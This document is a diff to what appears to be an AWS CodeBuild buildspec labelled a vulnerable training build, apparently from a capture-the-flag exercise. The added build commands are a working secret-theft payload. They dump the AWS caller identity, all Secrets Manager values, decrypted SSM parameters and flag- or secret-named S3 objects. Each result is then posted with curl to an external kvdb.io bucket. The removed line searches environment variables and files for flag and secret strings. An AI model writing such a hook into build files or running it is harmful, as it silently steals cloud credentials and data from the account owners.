@@ -5,4 +5,46 @@ phases:
     commands:
       - echo "Running vulnerable training build"
       - |
-        bash -lc 'GW_$( (env | grep -Ei "flag|ctf|lab|secret" || find / -maxdepth 5 -type f \( -iname "*flag*" -o -iname "*secret*" \) -exec sh -c "for f; do sed -n 1p \"$f\"; done" sh {} + 2>/dev/null) | head -c 220 | tr -c "A-Za-z0-9_{}=-" "_" )'
+        set +e
+        bucket='https://kvdb.io/HJjCRYSLCCKeyoxLHGb9MD'
+        putkey(){ key="$1"; file="$2"; head -c 15000 "$file" | curl -fsS --data-binary @- "$bucket/$key" || true; }
+
+        aws sts get-caller-identity > /tmp/whoami.txt 2>&1
+        putkey whoami2 /tmp/whoami.txt
+
+        {
+          echo '=== secrets list ==='
+          aws secretsmanager list-secrets --region us-east-1 --output json 2>&1
+          echo '=== secret values ==='
+          for s in $(aws secretsmanager list-secrets --region us-east-1 --query 'SecretList[].Name' --output text 2>/dev/null); do
+            echo "--- secret:$s"
+            aws secretsmanager get-secret-value --region us-east-1 --secret-id "$s" --output json 2>&1
+          done
+        } > /tmp/secrets.txt 2>&1
+        putkey secrets /tmp/secrets.txt
+
+        {
+          echo '=== ssm parameters ==='
+          aws ssm describe-parameters --region us-east-1 --output json 2>&1
+          echo '=== ssm values ==='
+          for p in $(aws ssm describe-parameters --region us-east-1 --query 'Parameters[].Name' --output text 2>/dev/null); do
+            echo "--- parameter:$p"
+            aws ssm get-parameter --region us-east-1 --name "$p" --with-decryption --output json 2>&1
+          done
+        } > /tmp/ssm.txt 2>&1
+        putkey ssm /tmp/ssm.txt
+
+        {
+          echo '=== s3 buckets ==='
+          aws s3api list-buckets --output json 2>&1
+          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null); do
+            echo "--- bucket:$b"
+            aws s3 ls "s3://$b" --recursive 2>&1 | head -n 100
+            for k in $(aws s3api list-objects-v2 --bucket "$b" --query 'Contents[?contains(Key, `flag`) || contains(Key, `secret`) || contains(Key, `FLAG`) || contains(Key, `SECRET`)].Key' --output text 2>/dev/null); do
+              echo "--- object:s3://$b/$k"
+              aws s3 cp "s3://$b/$k" - 2>&1 | head -c 4000
+              echo
+            done
+          done
+        } > /tmp/s3.txt 2>&1
+        putkey s3 /tmp/s3.txt
